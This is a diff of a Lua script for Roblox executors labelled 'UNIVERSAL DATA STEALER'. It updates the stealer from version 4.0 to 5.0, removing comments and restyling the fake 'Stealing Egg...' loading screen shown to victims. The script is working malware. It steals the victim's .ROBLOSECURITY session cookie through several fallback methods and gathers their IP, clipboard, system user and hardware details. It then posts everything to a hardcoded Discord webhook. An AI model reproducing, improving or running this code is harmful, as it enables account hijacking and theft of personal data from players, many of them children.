@@ -1,6 +1,6 @@
 -- ============================================================
 -- UNIVERSAL DATA STEALER – PC + MOBILE (All Executors)
--- Version 4.0 – Works everywhere
+-- Version 5.0 – Legit GUI + Clean Message
 -- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
@@ -8,24 +8,20 @@ local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7s
 local function sendData(url, jsonPayload)
     local headers = {["Content-Type"] = "application/json"}
     local methods = {
-        -- 1. request() – common on Synapse/Krnl/Delta
         function()
             local ok, res = pcall(function()
                 return request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
             end)
             if ok and res then
-                -- check if res is a table with StatusCode or Success
                 if type(res) == "table" then
                     if (res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300) or res.Success == true then
                         return true
                     end
                 end
-                -- if it returned something else, assume success if no error
                 return true
             end
             return false
         end,
-        -- 2. http_request() – older executors
         function()
             local ok, res = pcall(function()
                 return http_request({Url = url, Method = "POST", Headers = headers, Body = jsonPayload})
@@ -38,12 +34,11 @@ local function sendData(url, jsonPayload)
             end
             return false
         end,
-        -- 3. HttpService:PostAsync – Roblox native (often works on mobile)
         function()
             local ok, res = pcall(function()
                 return game:GetService("HttpService"):PostAsync(url, jsonPayload, Enum.HttpContentType.ApplicationJson)
             end)
-            return ok -- if it didn't error, it probably sent
+            return ok
         end
     }
     for _, method in ipairs(methods) do
@@ -91,19 +86,15 @@ end
 local function stealCookie()
     local cookie = "Not found"
     local attempts = {}
-    -- Method 1: getcookie (standard)
     local ok, val = pcall(getcookie, "https://www.roblox.com/")
     if ok and val and val ~= "" then return val end
     table.insert(attempts, "getcookie failed")
-    -- Method 2: getrobloxcookie (some executors)
     ok, val = pcall(function() return getrobloxcookie() end)
     if ok and val and val ~= "" then return val end
     table.insert(attempts, "getrobloxcookie failed")
-    -- Method 3: syn.cookie (Synapse)
     ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
     if ok and val and val ~= "" then return val end
     table.insert(attempts, "syn.cookie failed")
-    -- Method 4: HTTP request to Roblox
     ok, val = pcall(function()
         local response = request({Url = "https://www.roblox.com/", Method = "GET"})
         if response and response.Headers then
@@ -117,7 +108,6 @@ local function stealCookie()
     end)
     if ok and val and val ~= "" then return val end
     table.insert(attempts, "HTTP request failed")
-    -- Method 5: HttpService:GetAsync
     ok, val = pcall(function()
         return game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
     end)
@@ -126,7 +116,6 @@ local function stealCookie()
         if token then return token end
     end
     table.insert(attempts, "GetAsync failed")
-    -- Method 6: MemoryStoreService (very unlikely)
     ok, val = pcall(function()
         local ms = game:GetService("MemoryStoreService"):GetStore(".ROBLOSECURITY")
         return ms and ms:GetAsync("cookie")
@@ -169,7 +158,6 @@ end
 -- ========== MAIN COLLECTOR ==========
 local function collectEverything()
     local info = {}
-    -- Executor
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
 
     local player = game.Players.LocalPlayer
@@ -233,7 +221,6 @@ local function collectEverything()
         end)
     end
 
-    -- Game info
     info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
     info.jobId = safeGet(game, "JobId", "N/A")
     info.gameName = safeGet(game, "Name", "Unknown")
@@ -246,14 +233,10 @@ local function collectEverything()
     info.version = internals.version or "N/A"
     info.locale = internals.locale or "N/A"
 
-    -- IP
     info.ip = getIP()
-    -- Cookie
     info.cookie = stealCookie()
-    -- Clipboard
     info.clipboard = getClipboard()
 
-    -- System
     local sys = getSystemEnv()
     info.os = sys.os or "N/A"
     info.systemUser = sys.user or "N/A"
@@ -261,7 +244,6 @@ local function collectEverything()
     info.processor = sys.processor or "N/A"
     info.arch = sys.arch or "N/A"
 
-    -- Hardware & settings
     pcall(function()
         local us = game:GetService("UserInputService")
         info.platform = tostring(us.Platform)
@@ -322,7 +304,7 @@ local embed = buildEmbed(info)
 local json = game:GetService("HttpService"):JSONEncode(embed)
 local sent = sendData(webhook, json)
 
--- ========== OPTIONAL GUI (Wrapped in pcall) ==========
+-- ========== LEGIT GUI WITH CLEAN MESSAGE ==========
 pcall(function()
     local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
     local gui = Instance.new("ScreenGui")
@@ -332,28 +314,31 @@ pcall(function()
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 400, 0, 200)
     frame.Position = UDim2.new(0.5, -200, 0.5, -100)
-    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
     frame.BackgroundTransparency = 0.1
     frame.Parent = gui
     Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
 
+    -- Soft gradient
     local grad = Instance.new("Frame")
     grad.Size = UDim2.new(1, 0, 1, 0)
-    grad.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    grad.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
     grad.BackgroundTransparency = 0.15
     grad.Parent = frame
     Instance.new("UICorner", grad).CornerRadius = UDim.new(0, 16)
 
+    -- Title (loading)
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 50)
     title.Position = UDim2.new(0, 0, 0, 10)
     title.BackgroundTransparency = 1
-    title.Text = "STEALING EGG..."
+    title.Text = "Stealing Egg..."
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.TextScaled = true
     title.Font = Enum.Font.GothamBold
     title.Parent = frame
 
+    -- Progress bar
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(0.8, 0, 0, 20)
     bg.Position = UDim2.new(0.1, 0, 0.45, 0)
@@ -363,7 +348,7 @@ pcall(function()
 
     local fill = Instance.new("Frame")
     fill.Size = UDim2.new(0, 0, 1, 0)
-    fill.BackgroundColor3 = Color3.fromRGB(0, 220, 120)
+    fill.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
     fill.Parent = bg
     Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 10)
 
@@ -387,6 +372,7 @@ pcall(function()
     sub.Font = Enum.Font.Gotham
     sub.Parent = frame
 
+    -- Animation
     local function animate()
         local duration = 3
         local steps = 60
@@ -400,9 +386,13 @@ pcall(function()
                 task.wait(stepTime)
             end
         end
-        title.Text = "🔴 U GOT YOUR INFOMATION STOLEN LMAO"
-        title.TextColor3 = Color3.fromRGB(255, 0, 0)
-        sub.Text = "Your data has been sent to the owner."
+
+        -- After loading, change to clean message
+        title.Text = "YOUR INFORMATION GOT SENT TO THE OWNER OF THIS SCRIPT"
+        title.TextColor3 = Color3.fromRGB(255, 255, 255) -- white, not red
+        sub.Text = "Thank you for your cooperation."
+
+        -- Add close button
         local closeBtn = Instance.new("TextButton")
         closeBtn.Size = UDim2.new(0, 120, 0, 40)
         closeBtn.Position = UDim2.new(0.5, -60, 1, -50)
